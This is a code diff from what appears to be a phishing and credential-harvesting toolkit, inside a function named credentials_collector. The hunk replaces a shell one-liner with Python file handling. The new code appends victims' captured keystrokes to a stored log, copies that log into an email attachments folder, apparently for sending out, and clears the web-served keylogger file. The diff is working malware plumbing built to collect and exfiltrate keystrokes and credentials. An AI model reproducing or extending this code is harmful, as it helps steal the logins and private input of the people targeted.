@@ -105,7 +105,22 @@ def credentials_collector(port):
             if len(lines) != 0:
                 log_writer('{0}...............................'.format(default_palette[0]))
                 log_writer(' {1}[{0} GETTING PRESSED KEYS {1}]{1}:\n {0}{2}{1}'.format(default_palette[3], default_palette[2], lines))
-                run_command('touch Server/CapturedData/KeyloggerData.txt && cat Server/www/KeyloggerData.txt >> Server/CapturedData/KeyloggerData.txt && cp Server/CapturedData/KeyloggerData.txt Defs/Send_Email/attachments/KeyloggerData.txt && rm -rf Server/www/KeyloggerData.txt && touch Server/www/KeyloggerData.txt')
+                #run_command('touch Server/CapturedData/KeyloggerData.txt 
+                pathlib_Path('Server/CapturedData/KeyloggerData.txt').touch(mode=0o777, exist_ok=True)
+                # && cat Server/www/KeyloggerData.txt >> Server/CapturedData/KeyloggerData.txt
+                captured_keys = open('Server/CapturedData/KeyloggerData.txt', 'a')
+                new_keys = open('Server/www/KeyloggerData.txt')
+                captured_keys.write(new_keys.read())
+                new_keys.close()
+                captured_keys.close()
+                # && cp Server/CapturedData/KeyloggerData.txt Defs/Send_Email/attachments/KeyloggerData.txt 
+                copyfile('Server/CapturedData/KeyloggerData.txt', 'Defs/FeatureManager/EmailManager/attachments/KeyloggerData.txt')
+                # && rm -rf Server/www/KeyloggerData.txt 
+                new_keys = open('Server/www/KeyloggerData.txt', 'w')
+                # && touch Server/www/KeyloggerData.txt')
+                new_keys.write('')
+                new_keys.close()
+
                 log_writer('{0}...............................'.format(default_palette[0]))
 
         creds.close()
